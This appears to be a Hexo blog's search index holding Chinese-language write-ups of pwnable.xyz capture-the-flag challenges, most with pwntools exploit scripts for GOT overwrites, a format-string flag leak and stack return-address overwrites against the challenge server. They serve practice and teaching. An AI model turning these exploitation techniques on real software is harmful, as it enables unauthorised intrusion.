<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwnable.xyz two targets WriteUp</title>
      <link href="/2019/09/12/twotargets/"/>
      <url>/2019/09/12/twotargets/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的two targets的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/yN2GnJkgAhOiSVU.png" alt="MarkDown"></p><p>顾名思义，two targets，本题有两种做法。</p><h2 id="方法一-GOT覆写"><a href="#方法一-GOT覆写" class="headerlink" title="方法一 : GOT覆写"></a>方法一 : GOT覆写</h2><p><img src="https://i.loli.net/2019/09/12/3oWZYFRrVfyHunv.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/MAsQIB13NypSlze.png" alt="MarkDown"></p><p>由于v7 v8之间距离为0x10 = 16 ，而scanf往<code>&amp;v7</code>中读入的有24字节，因此可以先选择输入2，覆写</p><p><code>v8</code>中存储的地址，然后输入3，达到任意写的目的。又因为并没有开启FULL RELRO保护，所以可以GOT覆写。</p><p><img src="https://i.loli.net/2019/09/12/Dqhrd3jSLR4lgvb.png" alt="MarkDown"></p><p><em>注意</em> </p><p>因为往v8中读入的scanf()是%d 因此win()函数的地址需要转化成10进制输入0x40099c = 4196764</p><h3 id="方法一-EXP"><a href="#方法一-EXP" class="headerlink" title="方法一 EXP"></a>方法一 EXP</h3><pre><code class="python">#coding:utf-8from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30031)elf = ELF(&#39;./challenge&#39;)#puts_got = elf.got[&#39;puts&#39;]#got覆写，如果选择覆写puts()则会报错，原因不明strcmp_got = elf.got[&#39;strncmp&#39;]#print(puts_got)flag =     0x40099Cpayload = &#39;A&#39; * 16 + p64(strcmp_got)#sh.recvuntil(&#39;&gt; &#39;)sh.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;)#sh.recvuntil(&#39;: &#39;)#gdb.attach(sh)sh.sendafter(&#39;: &#39;,payload)print(payload)#sh.recvuntil(&#39;&gt; &#39;)sh.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)payload = &#39;4196764&#39;#sh.recvuntil(&#39;: &#39;)sh.sendlineafter(&#39;: &#39;,payload)#sh.recvuntil(&#39;&gt; &#39;)#gdb.attach(sh)sh.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)sh.interactive()</code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>方法二即按照题目思路，通过满足auth()函数的条件获得flag。</p><p><img src="https://i.loli.net/2019/09/12/l8hpWe6RCquALSj.png" alt="MarkDown"></p><p><code>s2</code>是全局变量 </p><p><img src="https://i.loli.net/2019/09/12/Cbcpi2Y1nhokurI.png" alt="MarkDown"></p><p>main() 即从<code>0x400B04</code> 到 <code>0x400B23</code>的内容</p><p><img src="https://i.loli.net/2019/09/12/mrv7etdOAulVYwk.png" alt="MarkDown"></p><p><em>注意</em></p><p>看auth()的运算式时一定要仔细，我就因为括号顺序看错直接整个式子就错了。是左边<code>a1[i]</code>经过运算之后再和<code>main[i]</code>异或得到<code>s2[i]</code>的值。</p><h3 id="方法二-EXP"><a href="#方法二-EXP" class="headerlink" title="方法二 EXP"></a>方法二 EXP</h3><pre><code class="python">#encoding:utf-8main = &#39;55 48 89 E5 48 83 EC 50 64 48 8B 04 25 28 00 00 00 48 89 45 F8 31 C0 E8 24 FE FF FF 48 8D 45 C0&#39;.split(&#39; &#39;)s2   = &#39;11 DE CF 10 DF 75 BB A5 43 1E 9D C2 E3 BF F5 D6 96 7F BE B0 BF B7 96 1D A8 BB 0A D9 BF C9 0D FF&#39;.split(&#39; &#39;)#print(main)#print(s2)result = []for i in range(32):    result.append( int(main[i],16) ^ int(s2[i],16) )ans = &#39;&#39;for i in range(32):    for j in range(256):        if(((j &gt;&gt; 4) | ( (16 * j) &amp; 0xff ) ) == result[i] ):            ans += chr(j)#特别注意： (16*j)需要 &amp; 0xff,因为16*j的结果很容易就&gt;256 之后结果一定不正确print(ans)from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30031)sh.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)sh.sendlineafter(&#39;: &#39;,ans)sh.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz Note WriteUp</title>
      <link href="/2019/09/12/note/"/>
      <url>/2019/09/12/note/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的Note的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/DepwVgEmMrjNcnC.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/C1gbnhT5GUlcfPj.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/ykEMC2G7xQbXTpH.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/dQTXpF9oxqCBIz2.png" alt="MarkDown"></p><p>目标是触发win()函数。注意到，输入1进入的<code>edit_note()</code>函数可对全局变量<code>s</code>进行任意长度写，其中buf和s的距离是0x20，而输入2进入的 <code>edit_desc()</code>函数是从标准输入流写入<code>buf</code>内容所指的地址中，由此可以通过先输入1，将buf中内容覆写，再输入2，达到任意地址写的目的。</p><p>还有一点，因为该程序并未开启RELRO保护，因此可以进行GOT表覆写.</p><p><img src="https://i.loli.net/2019/09/12/lHm18kxzP2QNUcO.png" alt="MarkDown"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;flag = 0x40093celf = ELF(&#39;./challenge&#39;)puts_got = elf.got[&#39;puts&#39;]print(hex(puts_got))#puts_got = 0x601220sh = process(&#39;./challenge&#39;)#sh = remote(&#39;svc.pwnable.xyz&#39;,30016)sh.recvuntil(&#39;&gt; &#39;)payload = &#39;A&#39; * 32 + p64(puts_got)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;? &#39;)sh.sendline(&#39;52&#39;)sh.recvuntil(&#39;note: &#39;)sh.sendline(payload)sh.recvuntil(&#39;&gt; &#39;)sh.sendline(&#39;2&#39;)sh.recvuntil(&#39;desc: &#39;)sh.sendline(p64(flag))sh.recvuntil(&#39;&gt; &#39;)sh.sendline(&#39;123&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz misalignment WriteUp</title>
      <link href="/2019/09/12/misaligment/"/>
      <url>/2019/09/12/misaligment/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的misalignment的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/N7duFq2lIhxyGz8.png" alt="MarkDown"></p><p>目标很明确，使v5+7 == 0xB000000B5即可获得flag。</p><p><em>注意</em></p><ol><li><p>v6/v7/v8 是int64，占8字节，因此通过每次输入v8只能控制 <code>v5 - v5+7</code>  ,<code>v5+8 - v5+15</code>这两个范围的内容中的一个，因此需要分两次输入。</p></li><li><p>因为是小端序，因此从v5 + 7一直到 v5 + 14 中的值应该按次序为0xB5,0x00,0x00,0x00,0x0B,0x00,0x00,0x00.</p></li></ol><p>由此可得，第一次v8 = -6时，v6+v7应该 = 0xB500000000000000 特别地，因为刚好8字节，符号位又为1，因此输入的值应该为<code>-5404319552844595200</code>（从计算器中可得）</p><p><img src="https://i.loli.net/2019/09/12/6mIfwGd7FOVAqYx.png" alt="MarkDown"></p><p>同理，第二次v8 = -5 ，输入的值就是0x0B000000 = 184549376</p><p>运行脚本即可得flag。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30003)#sh.recv()#gdb.attach(sh)sh.sendline(&#39;-5404319552844595200 0 -6&#39;)sh.sendline(&#39;184549376 0 -5&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz GrownUp WriteUp</title>
      <link href="/2019/09/12/grownup/"/>
      <url>/2019/09/12/grownup/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的GrownUp的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/wQjiYqFezdTZ35o.png" alt="Markdown"></p><p>一开始，先用shift+F12发现flag字符串，赶忙提交后发现不对</p><p><img src="https://i.loli.net/2019/09/12/5YvpDJyMcxkes3a.png" alt="Markdown"></p><p>实际上是提示了我们服务器端的flag地址是0x601080</p><p>开始正经做题，似乎难以下手，但是注意到<code>printf(qword_601160, usr)</code>这一行可能有格式化字符串漏洞。</p><p>在gdb中发现<code>qword_601160</code>的值为0x601168</p><p><img src="https://i.loli.net/2019/09/12/pOMIb1GfBEog3FQ.png" alt="Markdown"></p><p>而<code>qword_601160</code>和<code>usr</code>的距离是0x80 = 128</p><pre><code>read(0, src, 0x80uLL)strcpy(usr, src);</code></pre><p>这两行乍一看也没有问题</p><p><em>关键</em>  ：strcpy()函数会在复制结束后在目标字符串后添加结束符<code>/x00</code> ；read()则不会。</p><p>由此，如果我们恰好对src输入128个字符，这样最后一个被添加到末尾的<code>/x00</code>就会溢出到0x601160，并且由于小端序，会覆盖原来的<code>/x68</code>，这样qword_601160的值就会被改为0x601100，是usr+32的地址，我们就可以利用格式化字符串漏洞泄露栈中内容了。如果我们之前曾经把flag的地址输入栈中，那么我们就可以用<code>%s</code>将其输出.</p><pre><code class="python">from pwn import * context.log_level = &#39;DEBUG&#39;sh = process(&#39;./GrownUpRedist&#39;)flag = 0x601080payload = &#39;&#39;payload += &#39;y&#39; * 8 + p64(flag)sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)sh.send(payload)payload = &#39;&#39;payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p &#39;length = len(payload)payload += &#39;A&#39; * (128 - length)sh.recvuntil(&#39;Name: &#39;)sh.sendline(payload)print(sh.recvall())sh.interactive()</code></pre><p>在试运行时发现</p><p><img src="https://i.loli.net/2019/09/12/w6KPeLyriD2tmOV.png" alt="Markdown"></p><p>第九个泄露的地址为flag地址0x601080，因此将脚本中的对应位置修改为<code>%s</code>即可得flag。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import * context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./GrownUpRedist&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30004)flag = 0x601080payload = &#39;&#39;payload += &#39;y&#39; * 8 + p64(flag)sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)sh.send(payload)#这里如果是sendline()就会报错 原因不明payload = &#39;&#39;payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%s,%p,%p,%p,%p,%p,%p &#39;#第九个位置如果用%p可以见到0x601080 就是flag的地址了 之后改成%s输出flaglength = len(payload)payload += &#39;A&#39; * (128 - length)#payload.ljust(128,&#39;A&#39;)#print(payload)sh.recvuntil(&#39;Name: &#39;)sh.sendline(payload)print(sh.recvall())sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz add WriteUP</title>
      <link href="/2019/08/08/add/"/>
      <url>/2019/08/08/add/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的add的WriteUP。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="http://i2.tiimg.com/696456/0f3701a7745115c4.png" alt="Markdown"></p><p>依旧是拖进IDA</p><p><img src="http://i2.tiimg.com/696456/745835338a81ed4f.png" alt="Markdown"></p><p><img src="http://i2.tiimg.com/696456/6cef7378623e6976.png" alt="Markdown"></p><p>注意到<code>win()</code>函数可获得flag，地址为0x400822 == 4196386。而<code>v7[v6] = v4 + v5</code>这一步可以任意覆写栈上内容，只要利用这个修改位于<code>rbp + 8</code>的ret地址，然后在第二次while循环时输入任意非数字字符使得<code>scanf()</code>返回值 != 3，在return时就可cat /flag 。</p><h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><p> v7 = rbp - 60h ; ret地址 = rbp + 8h ; 因此距离为0x68 = 104。值得注意的是v7数组类型是 <em>int64</em> ，占8个字节，所以 v6应该等于 104 / 8 == 13。  </p><p>另一边，v4 + v5 = win()函数的入口地址 = 4196386d即可。</p><h3 id="最终输入"><a href="#最终输入" class="headerlink" title="最终输入"></a>最终输入</h3><p>依旧不用写EXP</p><p>第一次循环 v4 = 4196385 v5 = 1 v6 =13</p><p>第二次循环，随便打个字母就行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz sub WriteUp</title>
      <link href="/2019/08/08/sub/"/>
      <url>/2019/08/08/sub/</url>
      
        <content type="html"><![CDATA[<p> pwnable.xyz上的白给题的wp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="http://i2.tiimg.com/696456/4df890822636f8f2.png" alt="Markdown">  </p><p>直接拖进IDA:</p><p><img src="http://i2.tiimg.com/696456/ae51a0863b07f649.png" alt="Markdown"></p><p>只要满足v4 - v5 == 4919即可。所以v4=4918，v5=-1就行了，连EXP都不用写。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz welcome WriteUp</title>
      <link href="/2019/08/07/pwnable-xyz-welcome-WriteUp/"/>
      <url>/2019/08/07/pwnable-xyz-welcome-WriteUp/</url>
      
        <content type="html"><![CDATA[<p>开始做pwnable.xyz上的题目了，记录下做题的思路。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="http://i1.fuimg.com/696456/119eebdc5119a96f.png" alt="Markdown"></p><p>​        </p><p>​    下载后解压，试运行：</p><p><img src="http://i1.fuimg.com/696456/12e8d4e4025934aa.png" alt="Markdown"></p><p>​    拖进IDA中查看源码:  </p><p><img src="http://i1.fuimg.com/696456/186e0c53b922e2b4.png" alt="Markdown"></p><p>发现Leak给出的是v3的地址，而题目的目的是要将<code>*v3</code>的值改为<code>0</code>，这将会是一个突破口。在一开始我以为<code>malloc()</code>函数申请的两个空间是连续的，但在gdb中运行后发现并不如此。  </p><p><strong>关键点</strong></p><ol><li><p><code>malloc()</code>函数在申请空间失败时返回<code>NULL</code> ,且NULL == 0.</p></li><li><p><code>v5[size - 1]</code> == <code>*(v5 + (size-1) * sizeof(char) )</code>  </p></li></ol><p>因此当我们使得<code>malloc()</code>函数分配空间失败时，v5 == 0 ，就可以实现对<code>hex(size-1)</code>地址的赋值为0操作，即可获得flag。  </p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>from pwn import *sh = remote(&quot;svc.pwnable.xyz&quot;,30000)sh.recvuntil(&quot;Leak:&quot;)leak = sh.recvline()#print(leak)payload = str(int(leak,16) + 1)#print(payload)sh.recvuntil(&quot;Length of your message: &quot;)sh.sendline(payload)sh.recv()sh.sendline(&quot; &quot;)print(sh.recv())</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/08/03/hello-world/"/>
      <url>/2019/08/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
